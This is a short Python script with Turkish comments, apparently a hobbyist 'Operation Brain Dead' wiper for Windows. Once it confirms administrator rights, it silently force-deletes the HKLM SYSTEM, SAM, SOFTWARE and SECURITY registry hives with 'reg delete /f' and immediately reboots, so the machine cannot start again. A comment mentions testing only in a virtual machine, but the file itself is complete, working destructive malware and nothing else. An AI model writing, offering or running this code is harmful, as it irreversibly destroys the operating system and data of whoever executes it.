import os
import sys
import ctypes
import subprocess

# --- PİMSİZ: SİSTEMİN BEYNİNİ SİLER ---
# DİKKAT: Bu kod çalıştığı an Windows'un ayarları uçar.
# Sadece Sanal Makinede (VirtualBox) test et!

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def brain_dead():
    print("--- OPERATION: BRAIN DEAD BAŞLATILIYOR ---")
    print("[!] Hedef: Windows Kayıt Defteri (Registry)")
    print("[!] Amaç: İşletim Sistemini Tanınmaz Hale Getirmek")
    
    # Silinecek Kritik Anahtarlar (Windows'un Kalbi)
    # SYSTEM: Sürücüler ve Boot ayarları
    # SAM: Kullanıcı şifreleri ve hesapları
    # SOFTWARE: Yüklü programların ayarları
    # SECURITY: Güvenlik politikaları
    
    targets = [
        r"HKLM\SYSTEM",
        r"HKLM\SAM",
        r"HKLM\SOFTWARE",
        r"HKLM\SECURITY"
    ]
    
    print("\n[!] SİLME İŞLEMİ BAŞLIYOR... (Geri dönüş yok)")
    
    for key in targets:
        try:
            # Komut: 'reg delete [Anahtar] /f' (Zorla sil, soru sorma)
            # /f parametresi "Emin misin?" sorusunu atlar.
            cmd = f'reg delete "{key}" /f'
            
            # Komutu sessizce çalıştır
            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            print(f"💀 SİLİNDİ: {key}")
            
        except Exception as e:
            print(f"[-] Hata: {key} silinemedi.")

    print("\n[!] İŞLEM TAMAMLANDI.")
    print("Bilgisayarı yeniden başlattığınızda Windows açılmayacak.")
    print("Çünkü artık 'Neyim ben?' sorusunun cevabı yok.")
    
    # Final Vuruşu: Sistemi anında yeniden başlat
    os.system("shutdown /r /t 0")

if __name__ == "__main__":
    if is_admin():
        brain_dead()
    else:
        print("!!! YÖNETİCİ HAKLARI GEREKİYOR !!!")
        print("Bu kodu 'Yönetici Olarak Çalıştır' demeden yapamazsın.")